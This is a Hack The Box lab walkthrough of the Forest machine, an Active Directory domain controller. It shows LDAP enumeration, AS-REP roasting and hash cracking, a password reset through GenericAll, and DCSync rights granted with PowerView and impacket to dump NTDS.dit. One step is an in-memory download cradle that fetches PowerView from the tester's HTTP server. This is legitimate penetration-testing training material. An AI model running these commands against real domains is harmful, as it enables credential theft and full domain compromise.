+++
title = "Forest HTB Walkthrough: Active Directory, ASREPRoasting, and DCSync Exploitation"
draft = false
tags = ["Box", "HTB", "Easy", "Windows", "LDAP", "Active Directory", "DACL", "GenericWrite", "GenericAll", "Kerberos", "ASREPRoasting", "mimikatz", "Download Cradle"]
keywords = ["Hack The Box Forest", "Active Directory exploitation", "ASREPRoasting tutorial", "DCSync attack", "Windows privilege escalation", "LDAP enumeration", "Kerberos authentication", "Windows security assessment", "Active Directory penetration testing", "DACL exploitation"]
description = "A comprehensive walkthrough of the Forest machine from Hack The Box, covering Active Directory enumeration, ASREPRoasting, DCSync exploitation, and privilege escalation techniques. Learn about service account exploitation, DACL manipulation, and advanced Windows penetration testing methods."
author = "bloodstiller"
date = 2024-11-15
toc = true
bold = true
next = true
lastmod = 2024-11-15
+++

## Forest Hack The Box Walkthrough/Writeup: {#forest-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Forest>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -Pn -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Forest/scans/nmap  🍣 main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 12:54:10 zsh ❯ nmap $box -Pn -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 12:54 GMT
        Nmap scan report for 10.129.95.210
        Host is up (0.039s latency).
        Not shown: 989 closed tcp ports (reset)
        PORT     STATE SERVICE
        53/tcp   open  domain
        88/tcp   open  kerberos-sec
        135/tcp  open  msrpc
        139/tcp  open  netbios-ssn
        389/tcp  open  ldap
        445/tcp  open  microsoft-ds
        464/tcp  open  kpasswd5
        593/tcp  open  http-rpc-epmap
        636/tcp  open  ldapssl
        3268/tcp open  globalcatLDAP
        3269/tcp open  globalcatLDAPssl

        Nmap done: 1 IP address (1 host up) scanned in 0.81 seconds


        ```
    -   **Initial thoughts**:
        -   DNS
        -   Kerberos
        -   SMB
        -   RPC
        -   LDAP


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:

    -   `sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP`

    <!--listend-->

    ```shell
    kali in HTB/BlogEntriesMade/Forrest/scans/nmap  🍣 main  2GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 14:04:14 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-13 14:04 GMT
    Stats: 0:00:48 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
    SYN Stealth Scan Timing: About 92.80% done; ETC: 14:05 (0:00:04 remaining)
    Nmap scan report for htb.local (10.129.107.25)
    Host is up (0.042s latency).
    Not shown: 65512 closed tcp ports (reset)
    PORT      STATE SERVICE      VERSION
    53/tcp    open  domain       Simple DNS Plus
    88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-13 14:05:31Z)
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    9389/tcp  open  mc-nmf       .NET Message Framing
    47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49664/tcp open  msrpc        Microsoft Windows RPC
    49665/tcp open  msrpc        Microsoft Windows RPC
    49666/tcp open  msrpc        Microsoft Windows RPC
    49667/tcp open  msrpc        Microsoft Windows RPC
    49670/tcp open  msrpc        Microsoft Windows RPC
    49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
    49677/tcp open  msrpc        Microsoft Windows RPC
    49681/tcp open  msrpc        Microsoft Windows RPC
    49698/tcp open  msrpc        Microsoft Windows RPC
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=11/13%OT=53%CT=1%CU=40018%PV=Y%DS=2%DC=I%G=Y%TM=673
    OS:4B276%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%TS=C)SEQ(
    OS:SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=A)SEQ(SP=106%GCD=1%ISR=10B%T
    OS:I=RD%CI=I%TS=3)OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53C
    OS:NW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W
    OS:5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y
    OS:%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F
    OS:=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%
    OS:T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIP
    OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

    Network Distance: 2 hops
    Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    | smb2-security-mode:
    |   3:1:1:
    |_    Message signing enabled and required
    | smb-os-discovery:
    |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
    |   Computer name: FOREST
    |   NetBIOS computer name: FOREST\x00
    |   Domain name: htb.local
    |   Forest name: htb.local
    |   FQDN: FOREST.htb.local
    |_  System time: 2024-11-13T06:06:36-08:00
    | smb-security-mode:
    |   account_used: <blank>
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: required
    | smb2-time:
    |   date: 2024-11-13T14:06:40
    |_  start_date: 2024-11-13T14:01:08
    |_clock-skew: mean: 2h40m00s, deviation: 4h37m08s, median: 0s

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 132.69 seconds

    ```

    -   +Note+: I had to do a reset of the box as this scan was hanging.


### SMB `445`: {#smb-445}


#### Attempting to connect with NULL &amp; Guest sessions: {#attempting-to-connect-with-null-and-guest-sessions}

-   **This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold**:
    -   `netexec smb $box -u 'guest' -p '' --shares`
    -   `netexec smb $box -u '' -p '' --shares`
    -   Neither work we can see that Guest is disabled and NULL sessions are disabled.
        -   {{< figure src="/ox-hugo/2024-11-13-131230_.png" >}}
    -   +Note+: We can see the build number is `14393` so we can search for known exploits.
    - I check & it says M17-07 but this is not valid on this box. 


#### Trying Usernames as Passwords: {#trying-usernames-as-passwords}

-   **I always try usernames as passwords as well**:
    -   `netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+]`
    -   No dice, no users have used their username as passwords.


### DNS `53`: {#dns-53}

-   **Using dnsenum to enumerate DNS entries**:
    -   `dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain`
    -   {{< figure src="/ox-hugo/2024-11-13-133653_.png" >}}
    -   Standard entries for a DC.


### LDAP `389`: {#ldap-389}


#### Using LDAP anonymous bind to enumerate further: {#using-ldap-anonymous-bind-to-enumerate-further}

-   If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.
    -   We can actually retrieve a significant amount of information via anonymous bind such as:
        -   A list of all users
        -   A list of all groups
        -   A list of all computers.
        -   User account attributes.
        -   The domain password policy.
        -   Enumerate users who are susceptible to AS-REPRoasting.
        -   Passwords stored in the description fields
    -   The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates.

-   I actually have a handy script to check if anonymous bind is enabled &amp; if it is to dump a large amount of information. You can find it here
    -   <https://github.com/bloodstiller/ldapire>
    -   <https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb>
        -   `python3 /home/kali/windowsTools/enumeration/ldapire.py $box`
            -   It will dump general information &amp; also detailed &amp; simple information including:
                -   Groups
                -   Computers
                -   Users
                -   All domain objects
                -   A file containing all description fields
                -   It will also search the domain for any service/svc accounts and place them in a folder too.

<!--listend-->

1.  <span class="underline">We have the naming context of the domain</span>:
    ```shell
    kali in HTB/BlogEntriesMade/Forest/scans/ldap  🍣 main 📝 ×143🗃️  ×3🛤️  ×113 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
    🕙 08:32:01 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire/ldapire.py $box

    ------------------------------------------------------------
     Server Information
    ------------------------------------------------------------
      • IP Address  : 10.129.95.210
      • Domain Name : htb.local
      • Server Name : FOREST
      • Forest Level: 7
      • Domain Level: 7

    ```

<!--listend-->

-   It turns out the anonymous bind is enabled and we get the below information.
    ```shell
    ------------------------------------------------------------
     Connection Attempts
    ------------------------------------------------------------
      • Attempting SSL connection...
      ✗ Failed to connect with SSL
      • Attempting non-SSL connection...
      ✓ Connected successfully using anonymous bind

    ------------------------------------------------------------
     Security Warning
    ------------------------------------------------------------
      ⚠️  WARNING: Connected using Anonymous Bind
      ⚠️  This is a security risk and should be disabled
    ```

    1.  <span class="underline">We have the domain functionality level</span>:
        ```shell
          • Forest Level: 7
          • Domain Level: 7
        ```

        -   The functionality level determines the minimum version of Windows server that can be used for a DC.
            -   +Note+: that any host os can be used on **workstations**, however the functionality level determines what the minimum version for DC's and the forest.
            -   <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels>
            -   Knowing the function level is useful as if want to target the DC's and servers, we can know by looking at the function level what the minimum level of OS would be.

            -   In this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.
            -   Here's a list of functional level numbers and their corresponding Windows Server operating systems:

                | Functional Level Number | Corresponding OS            |
                |-------------------------|-----------------------------|
                | 0                       | Windows 2000                |
                | 1                       | Windows Server 2003 Interim |
                | 2                       | Windows Server 2003         |
                | 3                       | Windows Server 2008         |
                | 4                       | Windows Server 2008 R2      |
                | 5                       | Windows Server 2012         |
                | 6                       | Windows Server 2012 R2      |
                | 7                       | Windows Server 2016         |
                | 8                       | Windows Server 2019         |
                | 9                       | Windows Server 2022         |

                -   +Note+:
                    -   Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest.
                    -   As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers.

    2.  <span class="underline">We have the full server name &amp; domain name</span>:
        ```shell
        ------------------------------------------------------------
         Server Information
        ------------------------------------------------------------
          • IP Address  : 10.129.95.210
          • Domain Name : htb.local
          • Server Name : FOREST
        ```
-   It's pretty amazing already what we have learned just by running some fairly simple ldap queries.
    -   We have the naming context.
    -   Domain name.

-   The script also has created several files with various amounts on information lets examine those.
    ```shell
    ------------------------------------------------------------
     Processing Users
    ------------------------------------------------------------
    [+] Detailed results written to UsersDetailed.txt
    [+] Basic names written to Users.txt
      ✓ Basic user names    → Users.txt
      ✓ Detailed user info  → UsersDetailed.txt

    ------------------------------------------------------------
     Processing Groups
    ------------------------------------------------------------
    [+] Groups written to GroupsDetailed.txt
    [+] Basic names written to Groups.txt
      ✓ Basic group names   → Groups.txt
      ✓ Detailed group info → GroupsDetailed.txt

    ------------------------------------------------------------
     Processing Computers
    ------------------------------------------------------------
    [+] Computers written to ComputersDetailed.txt
    [+] Basic names written to Computers.txt
      ✓ Basic computer names    → Computers.txt
      ✓ Detailed computer info  → ComputersDetailed.txt

    ------------------------------------------------------------
     Processing All Objects
    ------------------------------------------------------------
    [+] Detailed results written to ObjectsDetailedLdap.txt
    [+] Basic names written to Objects.txt
      ✓ Basic object names     → Objects.txt
      ✓ Detailed object info   → ObjectsDetailedLdap.txt

    ------------------------------------------------------------
     Processing Descriptions
    ------------------------------------------------------------
    [+] All descriptions written to AllObjectDescriptions.txt
      ✓ All object descriptions → AllObjectDescriptions.txt
    ```

It will also check for any service accounts and write them to a file:

```shell
-----------------------------------------------------------
 Searching for Service Accounts
------------------------------------------------------------
  🔍 Searching Users.txt
  - No matches in Users.txt
  🔍 Searching UsersDetailed.txt
  ✓ Found matches in UsersDetailed.txt
  🔍 Searching Groups.txt
  ✓ Found matches in Groups.txt
  🔍 Searching GroupsDetailed.txt
  ✓ Found matches in GroupsDetailed.txt
  🔍 Searching Objects.txt
  ✓ Found matches in Objects.txt
  🔍 Searching ObjectsDetailedLdap.txt
  ✓ Found matches in ObjectsDetailedLdap.txt
  🔍 Searching AllObjectDescriptions.txt
  ✓ Found matches in AllObjectDescriptions.txt

  ✓ Service account findings written to ServiceAccounts.txt
  ✓ Found 646 potential matches

```


#### Updating ETC/HOSTS &amp; Variables: {#updating-etc-hosts-and-variables}

-   **Updated Domain &amp; Machine Variables for Testing**:
    -   Now that I have this information, I can update the `domain` and `machine` variables used in tests:
        -   `update_var domain "htb.local"`
        -   `update_var machine "forest"`

-   **Updating** `/etc/hosts` **for DNS and LDAP Queries**:
    -   I update my `/etc/hosts` file to enable tools like [kerbrute](https://github.com/ropnop/kerbrute) for user enumeration and other tools that require DNS or LDAP for queries:
        -   `echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts`


#### Syncing Clocks for Kerberos Exploitation: {#syncing-clocks-for-kerberos-exploitation}

-   Since Kerberos is enabled on this host, it's best practice to sync our clock with the host's. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts.
    -   `sudo ntpdate -s $domain`
    -   +Note+: I am doing this now as we have the DNS name etc.


#### Searching the descriptions file for any passwords: {#searching-the-descriptions-file-for-any-passwords}

-   **I search for the string pass in the description field file but only pull up standard RODC group entries**:
    -   {{< figure src="/ox-hugo/2024-11-14-084534_.png" >}}


#### Checking the users file: {#checking-the-users-file}

-   **As the tool extracts valid usernames I now have a good usernames list I can use for password spraying etc**:
    -   {{< figure src="/ox-hugo/2024-11-14-084650_.png" >}}


### Finding a service account svc-alfresco in our LDAP Results: {#finding-a-service-account-svc-alfresco-in-our-ldap-results}

-   As my tool extracts service accounts from all the files, it finds a service account called\* `svc-alfresco` in the Objects file:
    -   By running a simple search for `svc` I find the account.
    -   {{< figure src="/ox-hugo/2024-11-14-084821_.png" >}}
    -   This is interesting as it also shows that the account is in a dedicated OU called "Service Accounts."


#### Manually Finding the svc-alfresco service account: {#manually-finding-the-svc-alfresco-service-account}

-   First we would need to extract all OU's to get the name of the OU to query manually:
    -   `ldapsearch -x -H ldap://$domain -b "dc=htb,dc=local" "(objectClass=organizationalUnit)" sAMAccountName`
    -   As we can see it find the OU.
    -   {{< figure src="/ox-hugo/2024-11-14-180334_.png" >}}

-   Then we need to query for all objects within the OU `"Service Accounts"`:
    -   `ldapsearch -x -H ldap://$domain -b "ou=Service Accounts,dc=htb,dc=local" "(objectClass=*)" sAMAccountName`
    -   We can then eventually see the service account listed.
    -   {{< figure src="/ox-hugo/2024-11-14-171156_.png" >}}


#### Service Accounts in AD: {#service-accounts-in-ad}

-   In many Active Directory (AD) environments, **service accounts are often placed in a dedicated Organizational Unit (OU)** to simplify management and apply specific policies or permissions. However, this varies widely based on organizational practices and security policies.


##### Common Practices for Service Account OUs: {#common-practices-for-service-account-ous}

-   **Dedicated "Service Accounts" OU**: Many organizations create a specific OU for service accounts (e.g., `OU=Service Accounts,DC=domain,DC=com`) to make it easier to manage these accounts and apply Group Policies (GPOs).
-   **Separation by Department or Function**: Some environments organize service accounts by department (e.g., `OU=IT Service Accounts`) or function.
-   **Default Users OU**: In less mature AD setups, service accounts may reside in the default `Users` container or other existing OUs without specific segregation.


##### Benefits of Using a Dedicated Service Account OU: {#benefits-of-using-a-dedicated-service-account-ou}

-   **Centralized Management**: Easier to apply specific permissions, delegate access control, or manage policies for service accounts collectively.
-   **Enhanced Security**: Ensures that Group Policies can restrict privileges or enforce stricter password and lockout policies on service accounts, reducing attack surfaces.


### Kerberos `88`: {#kerberos-88}


#### AS-REP Roasting svc-alfresco to retrieve their hash with impacket-GetNPUsers: {#as-rep-roasting-svc-alfresco-to-retrieve-their-hash-with-impacket-getnpusers}

-   As we have a users file we can attempt to asreproast the users:
    -   `impacket-GetNPUsers $domain/ -dc-ip $box -usersfile Users.txt -format hashcat -outputfile asRepHashes.txt -no-pass`
    -   {{< figure src="/ox-hugo/2024-11-14-085814_.png" >}}
    -   We get a hit for "svc-alfresco"!
    -   +Note+: we could have also done `impacket-GetNPUsers $domain/ -request` and it will also find the account, however as I had the name of the account I was able to add it to my list of usernames and target them.


#### What is svc-alfresco account for: {#what-is-svc-alfresco-account-for}

-   **A quick search leads me to this page**:
    -   <https://docs.alfresco.com/identity-service/latest/tutorial/sso/kerberos/>
    -   We can see that they recommend that when setting up the service account that the "Do not require Kerberos pre-authentication." is enabled. So this is for this service to be able to authenticate back with the Domain Controller for authentication.
        -   {{< figure src="/ox-hugo/2024-11-15-070511_.png" >}}
    -   But bloodstiller what does "Do not require Kerberos pre-authentication." mean&#x2026;glad you asked.


#### AS-REP Roasting Primer: {#as-rep-roasting-primer}

-   ASREPRoasting is an attack against **Kerberos** authentication where an attacker requests an **AS-REP** (Authentication Service Response) for user accounts that have the `"Do not require Kerberos preauthentication"` setting enabled (like the svc-alfresco account).
    -   We can then attempt to crack the encrypted **TGT** (Ticket-Granting Ticket) offline to obtain plaintext credentials for the account.
    -   The `DONT_REQ_PREAUTH` flag can sometimes be required for service accounts for compatibility (as we can see above.)
-   ASREPRoasting is similar to **Kerberoasting** but targets `AS-REP` instead of `TGS-REP` (Ticket-Granting Service Response)
    -   +Detailed Deep Dive+: I have a deep dive on AS-REP Roasting.
        -   <https://bloodstiller.com/articles/understandingasreproasting/>


## 2. Foothold: {#2-dot-foothold}


### Cracking svc-alfresco's hash with hashcat: {#cracking-svc-alfresco-s-hash-with-hashcat}

-   I run hashcat to crack the hash:
    -   `hashcat -m 18200 asRepHashes.txt ~/Wordlists/rockyou.txt`
    -   It cracks
    -   {{< figure src="/ox-hugo/2024-11-14-090215_.png" >}}

-   I verify the creds are valid:
    -   `netexec smb $box -u $user -p $pass --shares`
    -   {{< figure src="/ox-hugo/2024-11-14-090510_.png" >}}
    -   They are

-   Grabbing our user flag:
    -   I login with evil-winrm and grab the user flag:
    -   {{< figure src="/ox-hugo/2024-11-14-160808_.png" >}}


### Performing a bloodhound collection as svc-alfresco: {#performing-a-bloodhound-collection-as-svc-alfresco}

-   As we have creds the best thing to do is perform a bloodhound collection to look at valid attack paths:
    -   `bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box`
    -   {{< figure src="/ox-hugo/2024-11-14-090607_.png" >}}

-   After I import the data I check for any direct paths to the domain controller object and there is a clear attack path (**or so it seems**):
    -   {{< figure src="/ox-hugo/2024-11-14-100654_.png" >}}
    -   We have nested group membership of `Account Operators` which has `GenericAll` over the `Enterprise Key Admins` &amp; `Key Admins` which both have the `AddKeyCredentialLink` privilege over the root domain object.
        -   This means we can make ourselves the group owner, give ourselves the privilege to add users, add ourselves to the group &amp; then we inherit the `AddKeyCredentialLink` privilege.
        -   The `AddKeyCredentialLink` allows us to perform a shadow credentials attack on the host so this looks like a good attack path and it would be in the right environment. 
        -   The reason this attack chain will not work is that the Domain Controller **does not have Active Directory Certificate Services (AD-CS) running** which means if we retrieved a certificate via a shadow credentials attack we could not authenticate against with it.


### Discovering we are part of the Privileged IT Accounts Group : {#discovering-we-are-part-of-the-privileged-it-accounts-group}

-   My next attack path, appears to be a lateral to the user "Sebastien".
    -   If we access the host using evil-winrm we can see that "Sebastien" also has an account on the host.
        -   {{< figure src="/ox-hugo/2024-11-14-133015_.png" >}}

-   As we are Part of the "Privileged IT Accounts" group which has nested group membership of the "Account Operators" group we inherit the `"GenericAll"` permission over "Sebastien" &amp; therefore can perform various attacks over him.
    -   {{< figure src="/ox-hugo/2024-11-14-132824_.png" >}}
    -   {{< figure src="/ox-hugo/2024-11-14-132727_.png" >}}


#### Performing A Targeted Kerberoasting Attack On Sebastien: {#performing-a-targeted-kerberoasting-attack-on-sebastien}

-   The first attack I will try is a Targeted Kerberoasting attack. "How does this attack work?" I hear you ask, good thing I am here:
    -   +Requirements+: For us to be able to perform this attack we need one of the following privileges over the user:
        -   `GenericAll`
        -   `GenericWrite`
        -   `WriteProperty`
        -   `Validated-SPN`
        -   `WriteProperties`

    -   If we have one of the above privileges we can then do the following:
        1.  Attach/generate an SPN for the user account.
        2.  Request TGS for the user account (and save it.)
        3.  As TGS is encrypted with NTLM password hash we can then crack and overtake user account.

-   I download `targetedkerberoast.py` &amp; perform the attack:
    -   `git clone https://github.com/ShutdownRepo/targetedKerberoast`

-   I add the SPN to "sebastien" and this is saved to the file `sebastien.kerb`
    -   `python3 targetedKerberoast.py -v -d $domain -u $user -p $pass --request-user sebastien -o sebastien.kerb`
    -   {{< figure src="/ox-hugo/2024-11-14-133253_.png" >}}

-   I then attempt to crack the hash, however **I cannot crack it** :(
    -   `hashcat -m 13100 sebastien.kerb /home/kali/Wordlists/rockyou.txt -O`
    -   {{< figure src="/ox-hugo/2024-11-14-133836_.png" >}}
    -   I could try other rules but this box is rated as easy so if it's not in `rockyou.txt` I doubt it will be intended to be cracked.


#### Modifying "Sebastien's" Password To Login As Him: {#modifying-sebastien-s-password-to-login-as-him}

-   As we cannot crack the hash so we will move onto changing passwords. As we have `"GenericAll"` privileges we can do what we want to his account.
    -   `newPass=bl00dst1ll3r!`
    -   `net rpc password "SEBASTIEN" $newPass -U $domain/$user%$pass -S $box`
    -   {{< figure src="/ox-hugo/2024-11-14-134624_.png" >}}
    -   +Note+:
        -   I do not like changing users passwords and see it as a last resort.
        -   There is no output from this so we need to verify it worked

-   Verify it works "Sebastien's" new creds work
    -   `netexec smb $box -u $user -p $newPass --shares`
    -   {{< figure src="/ox-hugo/2024-11-14-134651_.png" >}}


#### Modifying "Sebastien's" Group Memberships To Enable Us To Login: {#modifying-sebastien-s-group-memberships-to-enable-us-to-login}

So we can login as "Sebastien" we will need to add him to the local group "`Remote Management Users`"

-   Back in my "svc-alfresco" shell I add "Sebastien" to the "Remote Management Users" local group so he can login:
    -   `net localgroup "Remote Management Users" sebastien /add`
    -   {{< figure src="/ox-hugo/2024-11-14-160552_.png" >}}

-   After some enumerating there appears to be nothing interesting "Sebastien" has access to on the host:
    -   {{< figure src="/ox-hugo/2024-11-14-160713_.png" >}}


## 3. Privilege Escalation: {#3-dot-privilege-escalation}

### Finding Another Privilege Escalation Path In Bloodhound: {#finding-another-privilege-escalation-path-in-bloodhound}

-   Re-examining my bloodhound results the attack path seems very clear now. (woops) We have a straight shot to the root domain object from "svc-alfresco"
-   "svc-alfresco" has inherited/nested membership to the `Account Operators` group &amp; as the Account Operators group has `GenericAll` over `EXCHANGE WINDOWS PERMISSIONS` group, we in turn have `GenericAll` privileges over this group, much like we did with "sebastien"
    -   {{< figure src="/ox-hugo/2024-11-14-162655_.png" >}}

-   **This gives us a few different attack paths**:
    -   The first and easiest is adding a new user to the "Exchange Windows Permission" group and then granting them DCSync privileges over the root domain object to dump NTDS.dit.
    -   The second is in beyond root where we can dump it with svc-alfresco, however I was only able to perform this once.


### Intended Path To Root Adding A User &amp; Granting Them DCSync Privileges: {#intended-path-to-root-adding-a-user-and-granting-them-dcsync-privileges}

As we have `GenericWrite` over the group "EXCHANGE WINDOWS PERMISSIONS" we can add any users to the group &amp; then in turn grant them DCSync privileges:

1.  Add a user to the groups from svc-alfresco shell via evil-winrm:
    -   `net user bloodstiller bl00dst1ll3r! /add /domain`
    -   {{< figure src="/ox-hugo/2024-11-14-141937_.png" >}}

2.  Add to the user to the group "Exchane Windows Permissions":
    -   `net group "Exchange Windows Permissions" bloodstiller /add`
    -   {{< figure src="/ox-hugo/2024-11-14-142013_.png" >}}

3.  Give the user remote management access by adding them to the group "Remote Management Users":
    -   `net localgroup "Remote Management Users" bloodstiller /add`
    -   {{< figure src="/ox-hugo/2024-11-14-142310_.png" >}}
    -   This part is not necessary, however I want to use mimikatz so want remove access.

4.  To modify the ACL of the user we have created, we need to use PowerView:
    -   To do this I will use a download cradle to load directly into memory for more information on download cradles see my +deep-dive+: <https://bloodstiller.com/articles/understandingdownloadcradles/>
    -   Stand up python server:
        -   `python -m http.server 9000`
    -   Load into memory:
        -   `iex(new-object net.webclient).downloadstring('http://10.10.14.99:9000/PowerView.ps1')`
        -   {{< figure src="/ox-hugo/2024-11-15-123938_.png" >}}

5.  As we are still logged in as svc-alfresco, we need to use a Credentialed Object to grant our user DCSync Privileges:

```powershell
$SecPassword = ConvertTo-SecureString 'bl00dst1ll3r!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\bloodstiller', $SecPassword)
```
   -   {{< figure src="/ox-hugo/2024-11-15-124006_.png" >}}

6.  Grant ours user DCSync privileges with PowerView:
    -   `Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity bloodstiller -Rights DCSync`
    -   {{< figure src="/ox-hugo/2024-11-15-124101_.png" >}}

7.  We can now use secrets-dump to dump the `NTDS.dit`.
    -   `impacket-secretsdump $domain/$user:$pass@$box`
    -   {{< figure src="/ox-hugo/2024-11-15-124343_.png" >}}

8.  We can now login as the administrator using their hash and get the flag:
    -   `evil-winrm -i $box -u $user -H $hash`
    -   {{< figure src="/ox-hugo/2024-11-15-124857_.png" >}}


### Granting svc-alfresco DCSync Rights (unintended path to root): {#granting-svc-alfresco-dcsync-rights--unintended-path-to-root}

+Note+: I have since tried to recreate this attack path with chaining the commands quickly and it will not work for me, maybe I got lucky on first try.

-   **Attack Path**:
    -   Make "svc-alfresco" owner of the group "Exchange Windows Permissions"
    -   Grant "svc-alfresco" the ability to add users to the group "Exchange Windows Permissions" by modifying the DACL.
    -   Add "svc-alfresco" to the group to group "Exchange Windows Permissions".
    -   Grant "svc-alfresco" DCSync privileges over the root domain object by modifying the DACL using our new inherited `WriteDacl` permission we now have by being part of the "Exhange Windows Permissions" group.

<!--listend-->

1.  Make "svc-alfresco" the new owner of Exchange Windows Permissions group:
    -   `impacket-owneredit -action write -new-owner $user -target-sid 'S-1-5-21-3072663084-364016917-1341370565-1121' $domain/$user:$pass`
    -   {{< figure src="/ox-hugo/2024-11-15-112951_.png" >}}
        -   +Note+: I extract the SID for this group from bloodhound, or we can use `impacket-lookupsid`
        -   {{< figure src="/ox-hugo/2024-11-15-112625_.png" >}}

2.  Grant "svc-alfresco" the ability to add users to the group by modifying the DACL's:
    -   `impacket-dacledit -action 'write' -rights 'WriteMembers' -principal $user -target-sid  'S-1-5-21-3072663084-364016917-1341370565-1121' $domain/$user:$pass`
    -   {{< figure src="/ox-hugo/2024-11-15-113129_.png" >}}

3.  Add "svc-alfresco" to the group:
    -   `net rpc group addmem "EXCHANGE WINDOWS PERMISSIONS" $user -U $domain/$user%$pass -S $box`
    -   {{< figure src="/ox-hugo/2024-11-15-113209_.png" >}}
    -   +Note+: There will be no output from this command, we need to instead verify it worked in the next command.

4.  Verify "svc-alfresco" is now part of the group\*:
    -   `net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U $domain/$user%$pass -S $box`
    -   {{< figure src="/ox-hugo/2024-11-15-113225_.png" >}}

5.  Grant "svc-alfresco" DCSync privileges:
    -   `impacket-dacledit -action 'write' -rights 'DCSync' -principal $user -target-dn 'DC=HTB,DC=LOCAL' $domain/$user:$pass`
    -   {{< figure src="/ox-hugo/2024-11-15-113525_.png" >}}
    -   It does not work due to insufficient rights, which I know to be incorrect as we have granted them.

6.  I check our group membership &amp; can see we have been removed from the group "Exchange Windows Permissions":
    -   `net rpc group members "EXCHANGE WINDOWS PERMISSIONS" -U $domain/$user%$pass -S $box`
